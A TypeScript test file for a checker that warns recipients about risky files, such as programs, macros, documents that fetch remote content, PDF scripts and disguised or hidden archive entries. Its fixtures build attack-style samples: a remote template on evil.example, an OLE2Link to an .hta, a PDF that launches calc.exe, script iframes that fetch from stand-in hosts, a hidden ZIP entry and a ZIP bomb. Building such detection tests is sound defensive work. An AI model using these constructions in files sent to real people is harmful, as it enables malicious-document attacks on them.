// The plain file checks that warn a recipient:
// programs, macros, documents that fetch
// something when opened, PDF scripts and attachments, programs in archives,
// locked files. Every fixture is built here, from its format's structure.
import assert from 'node:assert/strict'
import { describe, test } from 'node:test'
import { gzipSync, strToU8, zipSync, type Zippable } from 'fflate'
import { PDFDocument, PDFName, PDFString } from 'pdf-lib'
import { readFileSync } from 'node:fs'
import { checkBytes, endingOf, hostOf } from '../src/filecheck/check.ts'
import { readZipDirectory } from '../src/strip/zipdir.ts'
import type { Warning } from '../src/filecheck/types.ts'
import * as copy from '../src/fileWarnCopy.ts'

const kinds = (ws: Warning[]) => ws.map((w) => w.kind)
const check = async (b: Uint8Array, name: string) => kinds(await checkBytes(b, name))

type Files = Record<string, string | Uint8Array>
const zip = (files: Files) => zipSync(Object.fromEntries(Object.entries(files).map(([k, v]) => [k, typeof v === 'string' ? strToU8(v) : v])) as Zippable)

function concat(parts: Uint8Array[]): Uint8Array {
  const out = new Uint8Array(parts.reduce((n, p) => n + p.length, 0))
  let at = 0
  for (const p of parts) {
    out.set(p, at)
    at += p.length
  }
  return out
}

/** A Windows program's first bytes: "MZ", and "PE" where its header says. */
function windowsProgram(): Uint8Array {
  const b = new Uint8Array(256)
  b.set(strToU8('MZ'))
  new DataView(b.buffer).setUint32(0x3c, 0x80, true)
  b.set(strToU8('PE\0\0'), 0x80)
  return b
}

const bytesOf = (...v: number[]) => Uint8Array.from([...v, ...new Array(60).fill(0)])

/** A Compound File (Office's older container) whose directory lists these names. */
function compound(names: string[]): Uint8Array {
  const b = new Uint8Array(512 * 3)
  const v = new DataView(b.buffer)
  b.set([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])
  v.setUint16(0x1a, 0x3e, true)
  v.setUint16(0x1c, 3, true)
  v.setUint16(0x1e, 9, true) // 512-byte sectors
  v.setUint32(0x2c, 1, true)
  v.setUint32(0x30, 1, true) // the directory is sector 1
  v.setUint32(0x44, 0xfffffffe, true)
  v.setUint32(0x4c, 0, true) // the allocation table is sector 0
  for (let i = 1; i < 109; i++) v.setUint32(0x4c + 4 * i, 0xffffffff, true)
  v.setUint32(512, 0xfffffffd, true)
  v.setUint32(516, 0xfffffffe, true)
  for (let i = 2; i < 128; i++) v.setUint32(512 + 4 * i, 0xffffffff, true)
  names.slice(0, 4).forEach((name, k) => {
    const e = 1024 + 128 * k
    for (let i = 0; i < name.length; i++) v.setUint16(e + 2 * i, name.charCodeAt(i), true)
    v.setUint16(e + 0x40, (name.length + 1) * 2, true)
    b[e + 0x42] = k === 0 ? 5 : 1
  })
  return b
}

function tar(files: Record<string, string>): Uint8Array {
  const parts: Uint8Array[] = []
  for (const [name, text] of Object.entries(files)) {
    const head = new Uint8Array(512)
    const data = strToU8(text)
    head.set(strToU8(name))
    head.set(strToU8(data.length.toString(8).padStart(11, '0') + '\0'), 124)
    head.set(strToU8('ustar\0' + '00'), 257)
    parts.push(head, data, new Uint8Array((512 - (data.length % 512)) % 512))
  }
  parts.push(new Uint8Array(1024))
  return concat(parts)
}

/** Marks every entry of a ZIP as locked (general-purpose flag bit 0), as a password tool would. */
function locked(b: Uint8Array): Uint8Array {
  const out = b.slice()
  for (let i = 0; i + 4 <= out.length; i++) {
    if (out[i] !== 0x50 || out[i + 1] !== 0x4b) continue
    if (out[i + 2] === 3 && out[i + 3] === 4) out[i + 6] |= 1
    if (out[i + 2] === 1 && out[i + 3] === 2) out[i + 8] |= 1
  }
  return out
}

const XML = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
const REL = 'http://schemas.openxmlformats.org/officeDocument/2006/relationships'
const rels = (list: string[]) => `${XML}<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">${list.join('')}</Relationships>`
const docBody = (inner = '<w:p><w:r><w:t>Hello</w:t></w:r></w:p>') =>
  `${XML}<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"><w:body>${inner}</w:body></w:document>`

function docx(extra: Files = {}, types = 'application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml'): Uint8Array {
  return zip({
    '[Content_Types].xml': `${XML}<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"><Override PartName="/word/document.xml" ContentType="${types}"/></Types>`,
    '_rels/.rels': rels([`<Relationship Id="rId1" Type="${REL}/officeDocument" Target="word/document.xml"/>`]),
    'word/document.xml': docBody(),
    ...extra,
  })
}

function odt(extra: Files = {}, content = ''): Uint8Array {
  return zip({
    mimetype: 'application/vnd.oasis.opendocument.text',
    'content.xml': `${XML}<office:document-content xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:draw="urn:oasis:names:tc:opendocument:xmlns:drawing:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0"><office:body><office:text>${content}</office:text></office:body></office:document-content>`,
    'META-INF/manifest.xml': `${XML}<manifest:manifest xmlns:manifest="urn:oasis:names:tc:opendocument:xmlns:manifest:1.0"/>`,
    ...extra,
  })
}

async function pdf(change: (doc: PDFDocument) => void | Promise<void> = () => {}): Promise<Uint8Array> {
  const doc = await PDFDocument.create()
  doc.addPage()
  await change(doc)
  return doc.save()
}

describe('programs and scripts', () => {
  test('a Windows, Linux or Mac program is a program, whatever its ending says', async () => {
    assert.deepEqual(await check(windowsProgram(), 'setup.exe'), ['program'])
    assert.deepEqual(await check(bytesOf(0x7f, 0x45, 0x4c, 0x46), 'tool'), ['program'])
    assert.deepEqual(await check(bytesOf(0xcf, 0xfa, 0xed, 0xfe), 'app'), ['program'])
    assert.deepEqual(await check(bytesOf(0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 2), 'Tool'), ['program'])
  })

  test('one named like a document says so', async () => {
    const [w] = await checkBytes(windowsProgram(), 'Invoice.pdf')
    assert.deepEqual(w, { kind: 'disguised', claimed: '.pdf', real: 'program' })
    assert.deepEqual(await checkBytes(bytesOf(0x7f, 0x45, 0x4c, 0x46), 'photo.JPG'), [{ kind: 'disguised', claimed: '.jpg', real: 'program' }])
  })

  test('a Java class (which starts as a Mac program does) is not a program; an .exe that isn’t one runs nothing', async () => {
    assert.deepEqual(await check(bytesOf(0xca, 0xfe, 0xba, 0xbe, 0, 0, 0, 52), 'Main.class'), [])
    assert.deepEqual(await check(strToU8('just some text'), 'setup.exe'), [])
  })

  test('scripts and shortcuts are known by their endings; a #! script with none by its first line', async () => {
    for (const name of ['run.bat', 'go.cmd', 'x.ps1', 'a.vbs', 'b.js', 'c.hta', 'd.lnk', 'e.url', 'f.desktop', 'g.sh', 'h.command', 'i.py'])
      assert.deepEqual(await check(strToU8('echo hi'), name), ['script'], name)
    assert.deepEqual(await check(strToU8('#!/bin/sh\necho hi'), 'start'), ['script'])
    assert.deepEqual(await check(strToU8('#!/bin/sh\necho hi'), 'notes.txt'), [])
  })

  test('installers and apps by their endings', async () => {
    for (const name of ['x.msi', 'y.jar', 'z.apk', 'w.pkg', 'v.deb', 'u.appimage']) assert.deepEqual(await check(new Uint8Array(100), name), ['program'], name)
  })

  test('disk images, by their endings or an ISO’s marker', async () => {
    const iso = new Uint8Array(0x9000)
    iso.set(strToU8('CD001'), 0x8001)
    assert.deepEqual(await check(iso, 'disk.iso'), ['disk'])
    assert.deepEqual(await checkBytes(iso, 'holiday.jpg'), [{ kind: 'disguised', claimed: '.jpg', real: 'disk' }])
    assert.deepEqual(await check(new Uint8Array(600), 'mac.dmg'), ['disk'])
  })

  test('Android apps and Java programs inside a ZIP', async () => {
    assert.deepEqual(await check(zip({ 'AndroidManifest.xml': '<m/>', 'classes.dex': 'dex\n035' }), 'game.zip'), ['disguised'])
    assert.deepEqual(await check(zip({ 'META-INF/MANIFEST.MF': 'Main-Class: A', 'A.class': 'x' }), 'tool.jar'), ['program'])
  })
})

describe('Office files', () => {
  test('macros: a VBA project, a macro sheet, or a macro-enabled type', async () => {
    assert.deepEqual(await check(docx({ 'word/vbaProject.bin': new Uint8Array(10) }), 'a.docm'), ['macros'])
    assert.deepEqual(await check(docx({ 'xl/macrosheets/sheet1.xml': '<x/>' }), 'b.xlsx'), ['macros'])
    assert.deepEqual(await check(docx({}, 'application/vnd.ms-word.document.macroEnabled.main+xml'), 'c.docm'), ['macros'])
    assert.deepEqual(await check(docx(), 'plain.docx'), [])
  })

  test('a remote template, a linked picture or a share is fetched on opening; a hyperlink isn’t', async () => {
    const template = docx({
      'word/_rels/settings.xml.rels': rels([`<Relationship Id="rId1" Type="${REL}/attachedTemplate" Target="https://evil.example/t.dotm" TargetMode="External"/>`]),
    })
    assert.deepEqual(await checkBytes(template, 'cv.docx'), [{ kind: 'internet', hosts: ['evil.example'], opensIn: 'office' }])
    const picture = docx({
      'word/_rels/document.xml.rels': rels([
        `<Relationship Id="rId2" Type="${REL}/image" Target="http://Tracker.Example:8080/p.png?id=7&amp;x=1" TargetMode="External"/>`,
        `<Relationship Id="rId3" Type="${REL}/oleObject" Target="file://files.example/share/x.xlsx" TargetMode="External"/>`,
      ]),
    })
    assert.deepEqual(await checkBytes(picture, 'a.docx'), [{ kind: 'internet', hosts: ['tracker.example', 'files.example'], opensIn: 'office' }])
    const link = docx({
      'word/_rels/document.xml.rels': rels([`<Relationship Id="rId2" Type="${REL}/hyperlink" Target="https://example.org/" TargetMode="External"/>`]),
    })
    assert.deepEqual(await check(link, 'a.docx'), [])
    const local = docx({
      'word/_rels/document.xml.rels': rels([`<Relationship Id="rId2" Type="${REL}/image" Target="file:///C:/Users/x/a.png" TargetMode="External"/>`]),
    })
    assert.deepEqual(await check(local, 'a.docx'), [])
  })

  test('an INCLUDEPICTURE field, split across runs or simple, and a share in one', async () => {
    const split = docx({
      'word/document.xml': docBody(
        '<w:p><w:r><w:instrText xml:space="preserve"> INCLUDEPICTURE "http://pix.</w:instrText></w:r><w:r><w:instrText>example/a.png" \\d </w:instrText></w:r></w:p>',
      ),
    })
    assert.deepEqual(await checkBytes(split, 'a.docx'), [{ kind: 'internet', hosts: ['pix.example'], opensIn: 'office' }])
    const simple = docx({ 'word/footer1.xml': `${XML}<w:ftr xmlns:w="w"><w:fldSimple w:instr=' INCLUDETEXT "https://text.example/x.docx" '/></w:ftr>` })
    assert.deepEqual(kinds(await checkBytes(simple, 'a.docx')), ['internet'])
    const share = docx({
      'word/document.xml': docBody('<w:p><w:r><w:instrText> INCLUDEPICTURE "\\\\\\\\fileserver\\\\pics\\\\a.png" </w:instrText></w:r></w:p>'),
    })
    assert.deepEqual(await checkBytes(share, 'a.docx'), [{ kind: 'internet', hosts: ['fileserver'], opensIn: 'office' }])
  })

  test('older Office files: macros, and a locked new one', async () => {
    assert.deepEqual(await check(compound(['Root Entry', 'WordDocument', 'Macros', 'VBA']), 'old.doc'), ['macros'])
    assert.deepEqual(await check(compound(['Root Entry', 'WordDocument', '1Table', 'Data']), 'old.doc'), [])
    assert.deepEqual(await check(compound(['Root Entry', 'EncryptionInfo', 'EncryptedPackage']), 'secret.docx'), ['locked'])
  })
})

describe('LibreOffice files', () => {
  test('a Basic module, a script, or an event calling one is macros; an empty library isn’t', async () => {
    assert.deepEqual(await check(odt({ 'Basic/Standard/Module1.xml': '<script:module/>', 'Basic/Standard/script-lb.xml': '<x/>' }), 'a.odt'), ['macros'])
    assert.deepEqual(await check(odt({ 'Scripts/python/run.py': 'print(1)' }), 'a.odt'), ['macros'])
    assert.deepEqual(await check(odt({}, '<office:event-listeners><script:event-listener xlink:href="vnd.sun.star.script:Standard.Module1.Main?language=Basic"/></office:event-listeners>'), 'a.odt'), ['macros'])
    assert.deepEqual(await check(odt({ 'Basic/Standard/script-lb.xml': '<x/>', 'Basic/script-lc.xml': '<x/>' }), 'a.odt'), [])
  })

  test('a linked picture is fetched on opening; a hyperlink isn’t', async () => {
    const linked = odt({}, '<draw:frame><draw:image xlink:href="https://img.example/a.png" xlink:type="simple"/></draw:frame>')
    assert.deepEqual(await checkBytes(linked, 'a.odt'), [{ kind: 'internet', hosts: ['img.example'], opensIn: 'libreoffice' }])
    assert.deepEqual(await check(odt({}, '<text:p><text:a xlink:href="https://example.org/">site</text:a></text:p>'), 'a.odt'), [])
    assert.deepEqual(await check(odt({}, '<draw:image xlink:href="Pictures/1.png"/>'), 'a.odt'), [])
  })
})

describe('RTF', () => {
  test('a remote template or picture, and a linked object’s address', async () => {
    assert.deepEqual(await checkBytes(strToU8('{\\rtf1{\\*\\template https://evil.example/t.dot}Hi}'), 'a.rtf'), [{ kind: 'internet', hosts: ['evil.example'], opensIn: 'word' }])
    assert.deepEqual(kinds(await checkBytes(strToU8('{\\rtf1{\\field{\\*\\fldinst INCLUDEPICTURE "http://pix.example/a.png" \\\\d}}}'), 'a.rtf')), ['internet'])
    const link = strToU8('OLE2Link\0\0http://hta.example/x.hta\0')
    const hex = [...link].map((v) => v.toString(16).padStart(2, '0')).join('')
    assert.deepEqual(await checkBytes(strToU8(`{\\rtf1{\\object\\objautlink\\objupdate{\\*\\objdata ${hex}}}}`), 'a.rtf'), [{ kind: 'internet', hosts: ['hta.example'], opensIn: 'word' }])
    assert.deepEqual(await check(strToU8('{\\rtf1 Plain {\\b text}.}'), 'a.rtf'), [])
  })
})

describe('PDFs', () => {
  test('a script run on opening, one that runs later, attachments and launching', async () => {
    const open = await pdf((doc) => {
      doc.catalog.set(PDFName.of('OpenAction'), doc.context.obj({ S: 'JavaScript', JS: PDFString.of('app.alert(1)') }))
    })
    assert.deepEqual(await checkBytes(open, 'a.pdf'), [{ kind: 'pdf-scripts', onOpen: true }])
    const later = await pdf((doc) => {
      const page = doc.getPage(0)
      const widget = doc.context.register(doc.context.obj({ Type: 'Annot', Subtype: 'Widget', Rect: [0, 0, 10, 10], AA: { K: { S: 'JavaScript', JS: PDFString.of('x') } } }))
      page.node.set(PDFName.of('Annots'), doc.context.obj([widget]))
    })
    assert.deepEqual(await checkBytes(later, 'form.pdf'), [{ kind: 'pdf-scripts', onOpen: false }])
    const attached = await pdf((doc) => doc.attach(strToU8('hello'), 'note.txt', { mimeType: 'text/plain' }))
    assert.deepEqual(await check(attached, 'a.pdf'), ['attachments'])
    const launch = await pdf((doc) => {
      doc.catalog.set(PDFName.of('OpenAction'), doc.context.obj({ S: 'Launch', F: PDFString.of('calc.exe') }))
    })
    assert.deepEqual(await check(launch, 'a.pdf'), ['pdf-launch'])
    assert.deepEqual(await check(await pdf(), 'plain.pdf'), [])
  })

  test('an address opened as it opens, but not a link waiting to be clicked', async () => {
    const opened = await pdf((doc) => {
      doc.catalog.set(PDFName.of('OpenAction'), doc.context.obj({ S: 'URI', URI: PDFString.of('https://beacon.example/open?id=9') }))
    })
    assert.deepEqual(await checkBytes(opened, 'a.pdf'), [{ kind: 'internet', hosts: ['beacon.example'], opensIn: 'pdf' }])
    const link = await pdf((doc) => {
      const annot = doc.context.register(doc.context.obj({ Type: 'Annot', Subtype: 'Link', Rect: [0, 0, 10, 10], A: { S: 'URI', URI: PDFString.of('https://example.org/') } }))
      doc.getPage(0).node.set(PDFName.of('Annots'), doc.context.obj([annot]))
    })
    assert.deepEqual(await check(link, 'a.pdf'), [])
  })
})

describe('archives', () => {
  test('programs inside a ZIP, checked as files of their own, and a Mac app', async () => {
    assert.deepEqual(await checkBytes(zip({ 'photos/a.jpg': 'x', 'setup.exe': windowsProgram() }), 'pack.zip'), [
      { kind: 'inside', files: [{ name: 'setup.exe', warnings: [{ kind: 'program' }] }] },
    ])
    // As a file on its own: an .exe that isn't a program runs nothing.
    assert.deepEqual(await check(zip({ 'setup.exe': 'x' }), 'pack.zip'), [])
    assert.deepEqual(await checkBytes(zip({ 'Tool.app/Contents/MacOS/Tool': 'x', 'Tool.app/Contents/Info.plist': 'x', 'Tool.app/Contents/Resources/a.js': 'x' }), 'tool.zip'), [
      { kind: 'inside', files: [{ name: 'Tool.app', warnings: [{ kind: 'program' }] }] },
    ])
    assert.deepEqual(await check(zip({ 'a.jpg': 'x', 'notes.txt': 'y' }), 'photos.zip'), [])
  })

  test('documents inside a ZIP: macros, the internet, PDF scripts, and a program named like a document', async () => {
    const macros = docx({ 'word/vbaProject.bin': 'x' })
    const online = docx({ 'word/_rels/document.xml.rels': rels([`<Relationship Id="r9" Type="${REL}/attachedTemplate" Target="https://t.example/x.dotm" TargetMode="External"/>`]) })
    const scripted = await pdf((doc) => {
      doc.catalog.set(PDFName.of('OpenAction'), doc.context.obj({ S: 'JavaScript', JS: PDFString.of('app.alert(1)') }))
    })
    const found = await checkBytes(zip({ 'work/report.docm': macros, 'work/letter.docx': online, 'form.pdf': scripted, 'Invoice.pdf': windowsProgram(), 'a.jpg': 'x' }), 'work.zip')
    assert.deepEqual(found, [
      {
        kind: 'inside',
        files: [
          { name: 'work/report.docm', warnings: [{ kind: 'macros' }] },
          { name: 'work/letter.docx', warnings: [{ kind: 'internet', hosts: ['t.example'], opensIn: 'office' }] },
          { name: 'form.pdf', warnings: [{ kind: 'pdf-scripts', onOpen: true }] },
          { name: 'Invoice.pdf', warnings: [{ kind: 'disguised', claimed: '.pdf', real: 'program' }] },
        ],
      },
    ])
  })

  test('a file inside is listed under its name as the zip meant it, not its raw bytes', async () => {
    const z = zip({ 'caf_.exe': windowsProgram() })
    for (let i = 0; i < z.length; i++) if (z[i] === 0x5f) z[i] = 0x82 // "café.exe" as Windows writes it
    assert.deepEqual(await checkBytes(z, 'old.zip'), [{ kind: 'inside', files: [{ name: 'café.exe', warnings: [{ kind: 'program' }] }] }])
  })

  test('a zip inside a zip is judged by its names; a locked ZIP by its names too', async () => {
    const inner = zip({ 'run.bat': 'x', 'report.docm': docx({ 'word/vbaProject.bin': 'x' }) })
    const named = [{ name: 'run.bat', warnings: [{ kind: 'script' }] }, { name: 'report.docm', warnings: [{ kind: 'macros' }] }]
    assert.deepEqual(await checkBytes(zip({ 'more.zip': inner }), 'outer.zip'), [{ kind: 'inside', files: [{ name: 'more.zip', warnings: [{ kind: 'inside', files: named }] }] }])
    assert.deepEqual(await check(locked(zip({ 'a.jpg': 'x' })), 'secret.zip'), ['locked'])
    assert.deepEqual(await checkBytes(locked(zip({ 'run.bat': 'x', 'setup.exe': 'x' })), 'secret.zip'), [
      { kind: 'inside', files: [{ name: 'run.bat', warnings: [{ kind: 'script' }] }, { name: 'setup.exe', warnings: [{ kind: 'program' }] }] },
      { kind: 'locked' },
    ])
  })

  test('a folder only named like a Mac app hides nothing; a real app is listed once', async () => {
    assert.deepEqual(await checkBytes(zip({ 'Photos.app/setup.exe': windowsProgram(), 'Photos.app/a.jpg': 'x' }), 'p.zip'), [
      { kind: 'inside', files: [{ name: 'Photos.app/setup.exe', warnings: [{ kind: 'program' }] }] },
    ])
    assert.deepEqual(await checkBytes(zip({ 'Tool.app/Contents/MacOS/Tool': 'x', 'Tool.app/Contents/Resources/run.sh': 'x' }), 't.zip'), [
      { kind: 'inside', files: [{ name: 'Tool.app', warnings: [{ kind: 'program' }] }] },
    ])
  })

  test('past the first 2,000 files, the rest are judged by their names, not skipped', async () => {
    const files: Files = {}
    for (let i = 0; i < 2000; i++) files[`f${i}.txt`] = 'x'
    files['zz/run.bat'] = 'x'
    assert.deepEqual(await checkBytes(zip(files), 'many.zip'), [{ kind: 'inside', files: [{ name: 'zz/run.bat', warnings: [{ kind: 'script' }] }] }])
  })

  test('a zip with an Office part, but not named as a document, has its files checked too', async () => {
    const z = zip({ '[Content_Types].xml': '<Types/>', 'setup.exe': windowsProgram() })
    assert.deepEqual(await checkBytes(z, 'photos.zip'), [{ kind: 'inside', files: [{ name: 'setup.exe', warnings: [{ kind: 'program' }] }] }])
  })

  test('a zip the strict reader refuses is judged by the names its headers claim', async () => {
    // Two entries with one name: refused by the reader, which an unzip tool may not do.
    const z = zip({ 'a.txt': 'x', 'b.txt': 'y', 'run.bat': 'z' })
    for (let i = 0; i + 5 <= z.length; i++) if (z[i] === 0x62 && z[i + 1] === 0x2e && z[i + 2] === 0x74) z[i] = 0x61 // b.txt → a.txt
    assert.deepEqual(await checkBytes(z, 'odd.zip'), [{ kind: 'inside', files: [{ name: 'run.bat', warnings: [{ kind: 'script' }] }] }])
  })

  test('a file hidden between the ones a zip lists is judged by its name', async () => {
    const z = zip({ 'a.txt': 'x' })
    const hidden = zip({ 'run.bat': 'echo' })
    // The hidden file's local header and bytes go before the index; the index still lists only a.txt.
    const [a] = readZipDirectory(z)
    const cut = a.dataOffset + a.csize
    const local = hidden.subarray(0, readZipDirectory(hidden)[0].dataOffset + readZipDirectory(hidden)[0].csize)
    const out = new Uint8Array(z.length + local.length)
    out.set(z.subarray(0, cut))
    out.set(local, cut)
    out.set(z.subarray(cut), cut + local.length)
    const v = new DataView(out.buffer)
    v.setUint32(out.length - 22 + 16, v.getUint32(out.length - 22 + 16, true) + local.length, true)
    assert.deepEqual(await checkBytes(out, 'gap.zip'), [{ kind: 'inside', files: [{ name: 'run.bat', warnings: [{ kind: 'script' }] }] }])
  })

  test('crafted text can’t make the checks slow: tags are read in one pass', async () => {
    const rels = '<Relationship '.repeat(200_000)
    const t = performance.now()
    await checkBytes(docx({ 'word/_rels/document.xml.rels': rels }), 'big.docx')
    await checkBytes(strToU8('<a '.repeat(1_000_000)), 'page.html')
    // And a web page's sites: a million relative pictures, many absolute ones, a tag of endless attributes.
    await checkBytes(strToU8('<img src=x>'.repeat(500_000)), 'page.html')
    await checkBytes(strToU8('<img src=https://a.example/>'.repeat(200_000)), 'page.html')
    await checkBytes(strToU8(`<meta http-equiv=refresh ${'content=x '.repeat(500_000)}>`), 'page.html')
    assert.ok(performance.now() - t < 4000, `${Math.round(performance.now() - t)} ms`)
    assert.deepEqual(await check(strToU8('<p><img src=x onerror="alert(1)"></p>'), 'page.html'), ['web-page', 'web-scripts'])
  })

  test('a zip that unpacks to far more than it holds is read only so far, then judged by names', async () => {
    // Zeros, which deflate to a few KB each. Two are read (48 MB of the 64 MB), the third is past
    // what's left, and so is setup.exe: as a file it runs nothing, by its name it's a program.
    const zeros = new Uint8Array(24_000_000)
    const files = await checkBytes(zip({ 'a.bin': zeros, 'b.bin': zeros, 'c.bin': zeros, 'setup.exe': new Uint8Array(20_000_000) }), 'bomb.zip')
    assert.deepEqual(files, [{ kind: 'inside', files: [{ name: 'setup.exe', warnings: [{ kind: 'program' }] }] }])
  })

  test('tar and gzipped tar', async () => {
    assert.deepEqual(await check(tar({ 'bin/install.sh': 'echo', 'README': 'hi' }), 'a.tar'), ['inside'])
    assert.deepEqual(await check(gzipSync(tar({ 'pkg/app.AppImage': 'x' })), 'a.tar.gz'), ['inside'])
    assert.deepEqual(await check(gzipSync(tar({ 'docs/a.txt': 'x' })), 'a.tgz'), [])
  })
})

describe('web pages', () => {
  const web = async (html: string, name = 'page.html') => (await checkBytes(strToU8(html), name)).find((w) => w.kind === 'web-page')
  const hostsIn = async (html: string, name?: string) => {
    const w = await web(html, name)
    return w?.kind === 'web-page' ? w.hosts : undefined
  }

  test('a page or SVG with scripts, opened in a browser; not the same text under another name', async () => {
    assert.deepEqual(await check(strToU8('<!doctype html><p>Hi</p><script>alert(1)</script>'), 'page.html'), ['web-page', 'web-scripts'])
    assert.deepEqual(await check(strToU8('<svg xmlns="http://www.w3.org/2000/svg" onload="x()"></svg>'), 'logo.svg'), ['web-page', 'web-scripts'])
    assert.deepEqual(await check(strToU8('<a href="javascript:go()">x</a>'), 'a.htm'), ['web-page', 'web-scripts'])
    assert.deepEqual(await check(strToU8('<!doctype html><p>Hi</p><script>alert(1)</script>'), 'page.txt'), [])
    assert.deepEqual(await check(strToU8('<!doctype html><p>Some one=two text</p>'), 'page.html'), ['web-page'])
  })

  // A page that opens in a browser can tell a site who opened it, with a
  // picture or a script, so every one is warned of by its name, with the sites it loads from as it opens.
  test('every web page and SVG, by its name, whatever is in it', async () => {
    for (const name of ['a.html', 'a.HTM', 'a.xhtml', 'a.xht', 'a.shtml', 'a.mht', 'a.mhtml', 'a.svg'])
      assert.deepEqual(await checkBytes(strToU8('<p>Hello</p>'), name), [{ kind: 'web-page', hosts: [] }], name)
    // Even when it isn't text at all: a browser would still open it as a page.
    assert.deepEqual(await check(Uint8Array.of(0, 1, 2, 3, 0xff, 0xfe), 'x.html'), ['web-page'])
  })

  test('the sites it loads from as soon as it’s opened, however they’re written; not its links', async () => {
    assert.deepEqual(await hostsIn('<p>Hi</p><img src="https://pixel.example/t.gif" width=1 height=1>'), ['pixel.example'])
    assert.deepEqual(await hostsIn('<img src=https://unquoted.example/x.png>'), ['unquoted.example'])
    assert.deepEqual(await hostsIn("<img src='//relative.example/x.png'>"), ['relative.example'])
    assert.deepEqual(await hostsIn('<img srcset="https://a.example/1.png 1x, https://b.example/2.png 2x">'), ['a.example', 'b.example'])
    assert.deepEqual(await hostsIn('<link rel=stylesheet href="https://css.example/s.css"><link rel=dns-prefetch href=//dns.example>'), ['css.example', 'dns.example'])
    assert.deepEqual(await hostsIn('<style>@import "https://imp.example/a.css"; body { background: url(https://bg.example/b.png) }</style>'), ['imp.example', 'bg.example'])
    assert.deepEqual(await hostsIn('<div style="background-image:url(&quot;https://inline.example/i.png&quot;)"></div>'), ['inline.example'])
    assert.deepEqual(await hostsIn('<meta http-equiv="refresh" content="0; url=https://away.example/">'), ['away.example'])
    assert.deepEqual(await hostsIn('<iframe src="https://frame.example/"></iframe><object data="https://obj.example/x"></object><video poster="https://poster.example/p.jpg"></video>'), ['frame.example', 'obj.example', 'poster.example'])
    assert.deepEqual(await hostsIn('<base href="https://base.example/"><img src="x.png">'), ['base.example'])
    // An SVG's picture is fetched; <use> from elsewhere isn't, by any browser (the review, 2026-10-26).
    assert.deepEqual(await hostsIn('<svg xmlns="http://www.w3.org/2000/svg"><image href="https://svg.example/i.png"/><use xlink:href="https://use.example/u.svg#a"/></svg>', 'logo.svg'), ['svg.example'])
    // A network share: Windows would knock on that server's door.
    assert.deepEqual(await hostsIn('<img src="file://share.example/pub/x.png">'), ['share.example'])
    // Links go nowhere until clicked, and local files, data and relative addresses aren't sites.
    assert.deepEqual(await hostsIn('<a href="https://link.example/">x</a><area href="https://area.example/"><img src="photo.jpg"><img src="data:image/png;base64,AAAA">'), [])
  })

  test('the tricks that got past the scripts check: still a warning, and scripts read in UTF-16 too', async () => {
    // A page inside the page, as data or srcdoc: no "<script" to see, but by its name it's warned of.
    assert.ok(await web('<iframe src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnLy90LmV4YW1wbGUnKTwvc2NyaXB0Pg=="></iframe>'))
    assert.ok(await web('<iframe srcdoc="&lt;script&gt;fetch(&quot;//t.example&quot;)&lt;/script&gt;"></iframe>'))
    // A control character at the start: it isn't plain text to the other checks, but it's still a page.
    assert.deepEqual(await hostsIn('\x01<img src="https://ctl.example/x.gif">'), ['ctl.example'])
    // UTF-16, as Windows saves "Unicode" text: read as a browser would, by its byte-order mark.
    const utf16 = (s: string, be = false) => {
      const out = new Uint8Array(2 + s.length * 2)
      out.set(be ? [0xfe, 0xff] : [0xff, 0xfe])
      for (let i = 0; i < s.length; i++) out[2 + 2 * i + (be ? 1 : 0)] = s.charCodeAt(i)
      return out
    }
    const page = '<p>hi</p><script>new Image().src="//t.example/x"</script><img src="https://u16.example/x.gif">'
    for (const be of [false, true]) {
      const got = await checkBytes(utf16(page, be), 'page.htm')
      assert.deepEqual(got, [{ kind: 'web-page', hosts: ['u16.example'] }, { kind: 'web-scripts' }], be ? 'UTF-16BE' : 'UTF-16LE')
    }
  })

  test('inside a zip, read or by name', async () => {
    assert.deepEqual(await checkBytes(zip({ 'site/index.html': strToU8('<img src="https://z.example/x">') }), 'site.zip'), [
      { kind: 'inside', files: [{ name: 'site/index.html', warnings: [{ kind: 'web-page', hosts: ['z.example'] }] }] },
    ])
    assert.deepEqual(await checkBytes(tar({ 'docs/page.html': '<p>hi</p>' }), 'docs.tar'), [
      { kind: 'inside', files: [{ name: 'docs/page.html', warnings: [{ kind: 'web-page', hosts: [] }] }] },
    ])
  })
})


describe('everything else', () => {
  test('photos, text and damaged files get no warning', async () => {
    const png = Uint8Array.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a, ...new Array(100).fill(0)])
    assert.deepEqual(await check(png, 'photo.png'), [])
    assert.deepEqual(await check(strToU8('hello'), 'notes.txt'), [])
    assert.deepEqual(await check(new Uint8Array(0), ''), [])
    assert.deepEqual(await check(strToU8('PK\x03\x04 not really a zip'), 'broken.zip'), [])
    assert.deepEqual(await check(strToU8('%PDF-1.7 broken'), 'broken.pdf'), [])
  })

  test('endings and sites', () => {
    assert.equal(endingOf('Report.PDF'), 'pdf')
    assert.equal(endingOf('archive.tar.gz'), 'gz')
    assert.equal(endingOf('noending'), '')
    // A name that's only an ending is that ending, as Windows reads ".bat" (the review, 2026-10-26).
    assert.equal(endingOf('.hidden'), 'hidden')
    assert.equal(endingOf('run/.bat'), 'bat')
    assert.equal(endingOf('dir/file.exe. '), 'exe')
    assert.equal(hostOf('https://bücher.example/x'), 'xn--bcher-kva.example')
    assert.equal(hostOf('\\\\server\\share\\a.png'), 'server')
    assert.equal(hostOf('//cdn.example/a.png'), 'cdn.example')
    assert.equal(hostOf('mailto:a@example.org'), null)
    assert.equal(hostOf('file:///C:/a.png'), null)
    assert.equal(hostOf('Pictures/1.png'), null)
  })
})

describe('the words', () => {
  const every: Warning[] = [
    { kind: 'program' },
    { kind: 'script' },
    { kind: 'disguised', claimed: '.pdf', real: 'program' },
    { kind: 'disguised', claimed: '.jpg', real: 'disk' },
    { kind: 'disk' },
    { kind: 'macros' },
    { kind: 'internet', hosts: ['a.example'], opensIn: 'office' },
    { kind: 'internet', hosts: ['a.example', 'b.example'], opensIn: 'libreoffice' },
